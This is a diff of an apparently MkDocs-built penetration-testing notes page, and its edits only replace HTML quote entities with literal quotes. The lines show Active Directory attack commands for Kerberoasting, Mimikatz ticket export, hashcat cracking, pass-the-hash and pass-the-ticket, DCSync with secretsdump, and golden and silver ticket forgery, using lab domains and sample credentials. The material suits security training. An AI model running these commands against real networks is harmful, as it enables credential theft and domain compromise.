@@ -27712,7 +27712,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-5-18">18</a></span>
 <span class="normal"><a href="#__codelineno-5-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>python GetUserSPNs.py &lt;DomainName&gt;/&lt;DomainUser&gt;:&lt;Password&gt; -outputfile &lt;FileName&gt;
 </span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>python3 GetUserSPNs.py corp.com/peter:&#39;Strawberry1!&#39; -outputfile hash.txt
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>python3 GetUserSPNs.py corp.com/peter:'Strawberry1!' -outputfile hash.txt
 </span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>
 </span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a>########################################
 </span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a># Kerberoasting with Impacket
@@ -27895,7 +27895,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-6-68"><a id="__codelineno-6-68" name="__codelineno-6-68"></a>########################################
 </span><span id="__span-6-69"><a id="__codelineno-6-69" name="__codelineno-6-69"></a>
 </span><span id="__span-6-70"><a id="__codelineno-6-70" name="__codelineno-6-70"></a># Request tickets only for accounts with adminCount=1
-</span><span id="__span-6-71"><a id="__codelineno-6-71" name="__codelineno-6-71"></a>.\Rubeus.exe kerberoast /ldapfilter:&#39;admincount=1&#39; /nowrap
+</span><span id="__span-6-71"><a id="__codelineno-6-71" name="__codelineno-6-71"></a>.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 </span><span id="__span-6-72"><a id="__codelineno-6-72" name="__codelineno-6-72"></a>
 </span><span id="__span-6-73"><a id="__codelineno-6-73" name="__codelineno-6-73"></a># Request tickets for accounts whose passwords were set in a date range
 </span><span id="__span-6-74"><a id="__codelineno-6-74" name="__codelineno-6-74"></a>.\Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 /nowrap
@@ -27974,13 +27974,13 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a><span class="c"># -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using</span>
 </span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4"></a><span class="c"># System.IdentityModel is a namespace that contains different classes for building security token services</span>
 </span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5"></a>
-</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6"></a><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6"></a><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s2">"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"</span>
 </span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7"></a><span class="c">#  New-Object cmdlet to create an instance of a .NET Framework object.</span>
 </span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8"></a><span class="c"># System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token </span>
-</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9"></a><span class="c"># -ArgumentList &quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;: pass the SPN name to the class to request a Kerberos TGS ticket</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9"></a><span class="c"># -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433": pass the SPN name to the class to request a Kerberos TGS ticket</span>
 </span></code></pre></div></td></tr></table></div>
 <p><strong>3.</strong> If needed, we could also retrieve all tickets:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="n">setspn</span><span class="p">.</span><span class="n">exe</span> <span class="n">-T</span> <span class="n">INLANEFREIGHT</span><span class="p">.</span><span class="n">LOCAL</span> <span class="n">-Q</span> <span class="p">*/*</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s1">&#39;^CN&#39;</span> <span class="n">-Context</span> <span class="n">0</span><span class="p">,</span><span class="n">1</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Context</span><span class="p">.</span><span class="n">PostContext</span><span class="p">[</span><span class="n">0</span><span class="p">].</span><span class="n">Trim</span><span class="p">()</span> <span class="p">}</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="n">setspn</span><span class="p">.</span><span class="n">exe</span> <span class="n">-T</span> <span class="n">INLANEFREIGHT</span><span class="p">.</span><span class="n">LOCAL</span> <span class="n">-Q</span> <span class="p">*/*</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s1">'^CN'</span> <span class="n">-Context</span> <span class="n">0</span><span class="p">,</span><span class="n">1</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Context</span><span class="p">.</span><span class="n">PostContext</span><span class="p">[</span><span class="n">0</span><span class="p">].</span><span class="n">Trim</span><span class="p">()</span> <span class="p">}</span>
 </span></code></pre></div></td></tr></table></div>
 <p><strong>4.</strong> Extract Tickets from Memory with Mimikatz</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span>
@@ -28002,7 +28002,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9"></a>kerberos::list /export 
 </span></code></pre></div></td></tr></table></div>
 <p><strong>5.</strong> Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.</p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="go">echo &quot;&lt;base64 blob&gt;&quot; |  tr -d \\n </span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="go">echo "&lt;base64 blob&gt;" |  tr -d \\n </span>
 </span></code></pre></div></td></tr></table></div>
 <p><strong>6.</strong> We can place the above single line of output into a file and convert it back to a <code>.kirbi</code> file using the <code>base64</code> utility.</p>
 <div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="go">cat encoded_file | base64 -d &gt; sqldev.kirbi</span>
@@ -28011,7 +28011,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="go">python2.7 kirbi2john.py Filename.kirbi</span>
 </span></code></pre></div></td></tr></table></div>
 <p>This will create a file called <code>crack_file</code>. We then must modify the file a bit to be able to use Hashcat against the hash.</p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="go">sed &#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39; crack_file &gt; ServiceName_tgs_hashcat</span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="go">sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file &gt; ServiceName_tgs_hashcat</span>
 </span></code></pre></div></td></tr></table></div>
 <p><strong>8.</strong> Cracking the hash with Hashcat</p>
 <div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a><span class="go">hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt </span>
@@ -28181,31 +28181,31 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2"></a># Pass-the-Ticket (Kerberos ticket reuse)
 </span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3"></a>########################################  
 </span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4"></a># List kerberos tickets currently loadedand dump them  
-</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5"></a>.\mimikatz.exe &quot;token::elevate&quot; &quot;kerberos::list /dump&quot; &quot;exit&quot;  
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5"></a>.\mimikatz.exe "token::elevate" "kerberos::list /dump" "exit"  
 </span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6"></a>
 </span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7"></a># BASIC: Inject a kerberos ticket into the current session. Below more examples with different hashes.
-</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8"></a>.\mimikatz.exe &quot;kerberos::ptt &lt;TGT_ticket.kirbi&gt;&quot; &quot;exit&quot;
-</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9"></a>.\mimikatz.exe &quot;kerberos::ptt &lt;TGS_ticket.kirbi&gt;&quot; &quot;exit&quot;
+</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8"></a>.\mimikatz.exe "kerberos::ptt &lt;TGT_ticket.kirbi&gt;" "exit"
+</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9"></a>.\mimikatz.exe "kerberos::ptt &lt;TGS_ticket.kirbi&gt;" "exit"
 </span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10"></a>
 </span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11"></a>
 </span><span id="__span-28-12"><a id="__codelineno-28-12" name="__codelineno-28-12"></a># Create a process using NTLM hash  
-</span><span id="__span-28-13"><a id="__codelineno-28-13" name="__codelineno-28-13"></a>.\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:&lt;UserName&gt; /ntlm:&lt;NTLM_HASH&gt; /domain:&lt;DomainFQDN&gt;&quot; &quot;exit&quot;  
+</span><span id="__span-28-13"><a id="__codelineno-28-13" name="__codelineno-28-13"></a>.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:&lt;UserName&gt; /ntlm:&lt;NTLM_HASH&gt; /domain:&lt;DomainFQDN&gt;" "exit"  
 </span><span id="__span-28-14"><a id="__codelineno-28-14" name="__codelineno-28-14"></a>
 </span><span id="__span-28-15"><a id="__codelineno-28-15" name="__codelineno-28-15"></a># Example  
-</span><span id="__span-28-16"><a id="__codelineno-28-16" name="__codelineno-28-16"></a>.\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /ntlm:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local&quot; &quot;exit&quot;
+</span><span id="__span-28-16"><a id="__codelineno-28-16" name="__codelineno-28-16"></a>.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /ntlm:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local" "exit"
 </span><span id="__span-28-17"><a id="__codelineno-28-17" name="__codelineno-28-17"></a>
 </span><span id="__span-28-18"><a id="__codelineno-28-18" name="__codelineno-28-18"></a>
 </span><span id="__span-28-19"><a id="__codelineno-28-19" name="__codelineno-28-19"></a># Use NTLM hash to request a Kerberos TGT (Overpass-the-Hash)
-</span><span id="__span-28-20"><a id="__codelineno-28-20" name="__codelineno-28-20"></a>.\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:&lt;UserName&gt; /domain:&lt;DomainFQDN&gt; /rc4:&lt;NTLM_HASH&gt;&quot; &quot;exit&quot;
+</span><span id="__span-28-20"><a id="__codelineno-28-20" name="__codelineno-28-20"></a>.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:&lt;UserName&gt; /domain:&lt;DomainFQDN&gt; /rc4:&lt;NTLM_HASH&gt;" "exit"
 </span><span id="__span-28-21"><a id="__codelineno-28-21" name="__codelineno-28-21"></a>
 </span><span id="__span-28-22"><a id="__codelineno-28-22" name="__codelineno-28-22"></a># Example  
-</span><span id="__span-28-23"><a id="__codelineno-28-23" name="__codelineno-28-23"></a>.\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94 /run:cmd.exe&quot; &quot;exit&quot;
+</span><span id="__span-28-23"><a id="__codelineno-28-23" name="__codelineno-28-23"></a>.\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94 /run:cmd.exe" "exit"
 </span><span id="__span-28-24"><a id="__codelineno-28-24" name="__codelineno-28-24"></a>
 </span><span id="__span-28-25"><a id="__codelineno-28-25" name="__codelineno-28-25"></a># Use AES key instead of NTLM
-</span><span id="__span-28-26"><a id="__codelineno-28-26" name="__codelineno-28-26"></a>.\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:&lt;UserName&gt; /domain:&lt;DomainFQDN&gt; /aes256:&lt;AES_KEY&gt;&quot; &quot;exit&quot;
+</span><span id="__span-28-26"><a id="__codelineno-28-26" name="__codelineno-28-26"></a>.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:&lt;UserName&gt; /domain:&lt;DomainFQDN&gt; /aes256:&lt;AES_KEY&gt;" "exit"
 </span><span id="__span-28-27"><a id="__codelineno-28-27" name="__codelineno-28-27"></a>
 </span><span id="__span-28-28"><a id="__codelineno-28-28" name="__codelineno-28-28"></a># Example  
-</span><span id="__span-28-29"><a id="__codelineno-28-29" name="__codelineno-28-29"></a>.\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:corp.local /aes256:4f8b42c27bfa8e6a1c3d95d7f2f8c7c23f9f9c0d7e92b3b3bfb39d9b2e8d3c4a /run:powershell.exe&quot; &quot;exit&quot;
+</span><span id="__span-28-29"><a id="__codelineno-28-29" name="__codelineno-28-29"></a>.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:corp.local /aes256:4f8b42c27bfa8e6a1c3d95d7f2f8c7c23f9f9c0d7e92b3b3bfb39d9b2e8d3c4a /run:powershell.exe" "exit"
 </span></code></pre></div></td></tr></table></div>
 <h3 id="rubeus_3">Rubeus</h3>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1"> 1</a></span>
@@ -28259,7 +28259,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2"></a># Pass-the-Ticket with Impacket
 </span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3"></a>########################################
 </span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4"></a># Linux (Impacket)
-</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5"></a>getTGT.py &lt;DOMAIN&gt;/&#39;&lt;USER&gt;&#39;:&#39;&lt;PASSWORD&gt;&#39;
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5"></a>getTGT.py &lt;DOMAIN&gt;/'&lt;USER&gt;':'&lt;PASSWORD&gt;'
 </span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6"></a>
 </span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7"></a># Example:
 </span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8"></a>getTGT.py corp.com/pete:MattLovesAutumn1
@@ -28296,16 +28296,16 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3"></a>########################################  
 </span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4"></a>
 </span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5"></a># Replicate domain credential data from domain controller  
-</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6"></a>.\mimikatz.exe &quot;lsadump::dcsync /domain:&lt;DomainFQDN&gt; /all&quot; &quot;exit&quot;
+</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6"></a>.\mimikatz.exe "lsadump::dcsync /domain:&lt;DomainFQDN&gt; /all" "exit"
 </span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7"></a>
 </span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8"></a># Example  
-</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9"></a>.\mimikatz.exe &quot;lsadump::dcsync /domain:corp.com /all&quot; &quot;exit&quot;
+</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9"></a>.\mimikatz.exe "lsadump::dcsync /domain:corp.com /all" "exit"
 </span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10"></a>
 </span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11"></a># Example with just one user
-</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12"></a>.\mimikatz.exe &quot;lsadump::dcsync /user:corp\dave&quot; &quot;exit&quot;
+</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12"></a>.\mimikatz.exe "lsadump::dcsync /user:corp\dave" "exit"
 </span><span id="__span-31-13"><a id="__codelineno-31-13" name="__codelineno-31-13"></a>
 </span><span id="__span-31-14"><a id="__codelineno-31-14" name="__codelineno-31-14"></a># Notably, we can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator Administrator.
-</span><span id="__span-31-15"><a id="__codelineno-31-15" name="__codelineno-31-15"></a>.\mimikatz.exe &quot;lsadump::dcsync /user:corp\Administrator&quot; &quot;exit&quot;
+</span><span id="__span-31-15"><a id="__codelineno-31-15" name="__codelineno-31-15"></a>.\mimikatz.exe "lsadump::dcsync /user:corp\Administrator" "exit"
 </span></code></pre></div></td></tr></table></div>
 <p>Copy the NTLM hash and store it in a file named <strong>hashes.dcsync</strong> on our Kali system.</p>
 <h3 id="impacket-secretsdump">impacket-secretsdump</h3>
@@ -28329,10 +28329,10 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3"></a>########################################  
 </span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4"></a>
 </span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5"></a># Replicate domain credential data from domain controller and replicate password data for user dave 
-</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6"></a>impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:&quot;BrouhahaTungPerorateBroom2023\!&quot;@192.168.175.70
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6"></a>impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.175.70
 </span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7"></a>
 </span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8"></a># Replicate domain credential data from domain controller and replicate password data for user krbtgt
-</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9"></a>impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:&quot;BrouhahaTungPerorateBroom2023\!&quot;@192.168.175.70
+</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9"></a>impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.175.70
 </span></code></pre></div></td></tr></table></div>
 <h2 id="delegation-abuse-unconstrained">Delegation Abuse (Unconstrained)</h2>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-33-1"> 1</a></span>
@@ -28413,10 +28413,10 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3"></a>########################################
 </span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4"></a>
 </span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5"></a># Find computers with RBCD
-</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6"></a>Get-DomainObject -LDAPFilter &quot;(msDS-AllowedToActOnBehalfOfOtherIdentity=*)&quot;
+</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6"></a>Get-DomainObject -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
 </span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7"></a>
 </span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8"></a># Example
-</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9"></a>Get-DomainObject -LDAPFilter &quot;(msDS-AllowedToActOnBehalfOfOtherIdentity=*)&quot;
+</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9"></a>Get-DomainObject -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
 </span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10"></a>
 </span><span id="__span-35-11"><a id="__codelineno-35-11" name="__codelineno-35-11"></a>
 </span><span id="__span-35-12"><a id="__codelineno-35-12" name="__codelineno-35-12"></a># Abuse RBCD
@@ -28445,15 +28445,15 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3"></a>########################################  
 </span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4"></a>
 </span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5"></a># Forge a kerberos TGT using krbtgt hash  
-</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6"></a>.\mimikatz.exe &quot;token::elevate&quot;  &quot;kerberos::golden /user:Administrator /domain:&lt;DomainFQDN&gt; /sid:&lt;DomainSID&gt; /krbtgt:&lt;KRBTGT_HASH&gt; /ptt&quot; &quot;exit&quot;  
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6"></a>.\mimikatz.exe "token::elevate"  "kerberos::golden /user:Administrator /domain:&lt;DomainFQDN&gt; /sid:&lt;DomainSID&gt; /krbtgt:&lt;KRBTGT_HASH&gt; /ptt" "exit"  
 </span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7"></a>
 </span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8"></a># Example  
-</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9"></a>.\mimikatz.exe &quot;token::elevate&quot;  &quot;kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-234567890-345678901 /krbtgt:6f1e6d9a4f7a6f8c3c1d3a4b5c6d7e8f /ptt&quot; &quot;exit&quot;
+</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9"></a>.\mimikatz.exe "token::elevate"  "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-234567890-345678901 /krbtgt:6f1e6d9a4f7a6f8c3c1d3a4b5c6d7e8f /ptt" "exit"
 </span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10"></a>
 </span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11"></a># To get the SID
 </span><span id="__span-36-12"><a id="__codelineno-36-12" name="__codelineno-36-12"></a>whoami /user
 </span><span id="__span-36-13"><a id="__codelineno-36-13" name="__codelineno-36-13"></a>
-</span><span id="__span-36-14"><a id="__codelineno-36-14" name="__codelineno-36-14"></a>.\mimikatz.exe &quot;token::elevate&quot; &quot;kerberos::golden /user:Administrator /domain:sub.poseidon.yzx /sid:S-1-5-21-4168247447-1722543658-2110108262 /krbtgt:80f23a248d39b8cb93df3a4a2f4199a1 /ptt&quot; &quot;exit&quot;  
+</span><span id="__span-36-14"><a id="__codelineno-36-14" name="__codelineno-36-14"></a>.\mimikatz.exe "token::elevate" "kerberos::golden /user:Administrator /domain:sub.poseidon.yzx /sid:S-1-5-21-4168247447-1722543658-2110108262 /krbtgt:80f23a248d39b8cb93df3a4a2f4199a1 /ptt" "exit"  
 </span></code></pre></div></td></tr></table></div>
 <h2 id="ticket-forgery-silver-ticket">Ticket Forgery (Silver Ticket)</h2>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-37-1"> 1</a></span>
@@ -28472,13 +28472,13 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3"></a>########################################  
 </span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4"></a>
 </span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5"></a># Forge a service ticket for a specific service  
-</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6"></a>.\mimikatz.exe &quot;kerberos::golden /user:Administrator /domain:&lt;DomainFQDN&gt; /sid:&lt;DomainSID&gt; /target:&lt;server&gt; /service:cifs /rc4:&lt;SERVICE_HASH&gt; /ptt&quot; &quot;exit&quot;
+</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6"></a>.\mimikatz.exe "kerberos::golden /user:Administrator /domain:&lt;DomainFQDN&gt; /sid:&lt;DomainSID&gt; /target:&lt;server&gt; /service:cifs /rc4:&lt;SERVICE_HASH&gt; /ptt" "exit"
 </span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7"></a>
 </span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8"></a># Example  
-</span><span id="__span-37-9"><a id="__codelineno-37-9" name="__codelineno-37-9"></a>.\mimikatz.exe &quot;kerberos::golden /user:jeffadmin /domain:corp.com /sid:S-1-5-21-123456789-234567890-345678901 /target:http/files04.corp.com /service:iis_service /rc4:6f1e6d9a4f7a6f8c3c1d3a4b5c6d7e8f /ptt&quot; &quot;exit&quot;
